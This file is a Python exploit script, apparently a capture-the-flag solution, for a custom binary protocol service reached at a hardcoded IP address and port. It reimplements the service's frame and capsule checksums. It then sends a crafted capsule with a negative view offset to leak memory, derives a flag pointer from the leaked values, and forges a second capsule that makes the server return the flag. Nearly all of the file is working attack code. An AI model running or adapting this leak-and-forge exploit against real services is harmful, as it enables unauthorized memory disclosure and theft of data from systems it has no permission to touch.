#!/usr/bin/env python3
import re
import socket
import struct
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "178.105.199.41"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 20001

MASK32 = 0xFFFFFFFF


def rol32(x, n):
    return ((x << n) & MASK32) | (x >> (32 - n))


def mix32(seed, data):
    x = seed
    for b in data:
        x = rol32(((x ^ b) * 0x45D9F3B) & MASK32, 7)
    return x


def uleb(n):
    out = []
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def sleb(n):
    out = []
    while True:
        b = n & 0x7F
        sign = b & 0x40
        nxt = n >> 7
        done = (nxt == 0 and not sign) or (nxt == -1 and sign)
        if not done:
            b |= 0x80
        out.append(b & 0xFF)
        n = nxt
        if done:
            return bytes(out)


def frame_crc(seed, header, body):
    header = bytearray(header[:16])
    header[12:16] = b"\x00" * 4
    h = mix32(seed ^ 0xC001CAFE, header)
    b = mix32(seed ^ 0x5E36B347, body)
    return h ^ b


def frame(seed, typ, body=b""):
    header = b"GORF" + struct.pack("<HHII", typ, 0, len(body), 0)
    crc = frame_crc(seed, header, body)
    return header[:12] + struct.pack("<I", crc) + body


def recvn(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise EOFError(data)
        data += chunk
    return data


def recv_frame(sock, seed):
    header = recvn(sock, 16)
    typ, _flags, length, crc = struct.unpack("<HHII", header[4:16])
    body = recvn(sock, length) if length else b""
    if frame_crc(seed, header, body) != crc:
        raise ValueError("bad response crc")
    return typ, body


def send_frame(sock, seed, typ, body=b""):
    sock.sendall(frame(seed, typ, body))
    return recv_frame(sock, seed)


def gfc(litr, code, syms, fixs, view=b"\x00"):
    sections = []
    off = 0
    for name, data, count in [
        (b"LITR", litr, 0),
        (b"CODE", code, len(code) // 8),
        (b"SYMS", syms, 1),
        (b"FIXS", fixs, 1),
        (b"VIEW", view, 0),
    ]:
        sections.append((name, off, len(data), count))
        off += len(data)

    table = b"".join(name + struct.pack("<III", off, size, count) for name, off, size, count in sections)
    body = litr + code + syms + fixs + view
    header_size = 24 + len(table)
    code_count = len(code) // 8
    header = bytearray(b"GFC2" + struct.pack("<HHHHI", 2, header_size, len(sections), 0, code_count))
    header += struct.pack(
        "<II",
        mix32(0x915589AA, table) ^ 0xA51C3D29,
        mix32(0x824E8EA7, body) ^ 0xA51C3D29,
    )
    return bytes(header) + table + body


def leak_capsule():
    litr = b"hello clean\n"
    code = struct.pack("<BBHI", 0x7F, 0, 0, 0)
    syms = uleb(0) + uleb(len(litr)) + uleb(0)
    fixs = b"\x00\x00\x00\x00"
    view = b"\x11" + sleb(-0x20) + uleb(0x80) + b"\x00"
    return gfc(litr, code, syms, fixs, view)


def exploit_capsule(flag_ptr, flag_len, cookie):
    plan = bytearray(0x80)
    plan[0x30:0x38] = cookie
    plan[0x38:0x40] = struct.pack("<Q", flag_ptr)
    plan[0x40:0x44] = struct.pack("<I", flag_len)
    plan[0x7C] = 1

    code = struct.pack("<BBHI", 0x7F, 0, 0, 0)
    syms = uleb(0) + uleb(0x80) + uleb(0)
    fixs = b"\x00\x00\x00\x00"
    return gfc(bytes(plan), code, syms, fixs)


def main():
    with socket.create_connection((HOST, PORT), timeout=5) as sock:
        sock.settimeout(5)
        sock.recv(4096)

        sock.sendall(frame(0x714A5C21, 1, b"forge/v2"))
        _typ, hello = recv_frame(sock, 0x714A5C21)
        nonce = int(re.search(rb"nonce=([0-9a-f]{8})", hello).group(1), 16)

        send_frame(sock, nonce, 2, leak_capsule())
        _typ, leak = send_frame(sock, nonce, 3)
        seed64 = int.from_bytes(leak[:8], "little")
        encoded_ptr = int.from_bytes(leak[8:16], "little")
        flag_ptr = seed64 ^ encoded_ptr ^ 0x736565645F676F72
        flag_len = int.from_bytes(leak[24:28], "little")

        cookie = b"PLANREAD"
        send_frame(sock, nonce, 2, exploit_capsule(flag_ptr, flag_len, cookie))
        send_frame(sock, nonce, 4)
        time.sleep(0.6)
        send_frame(sock, nonce, 6)
        _typ, flag = send_frame(sock, nonce, 8, cookie)
        print(flag.decode(errors="replace"))


if __name__ == "__main__":
    main()
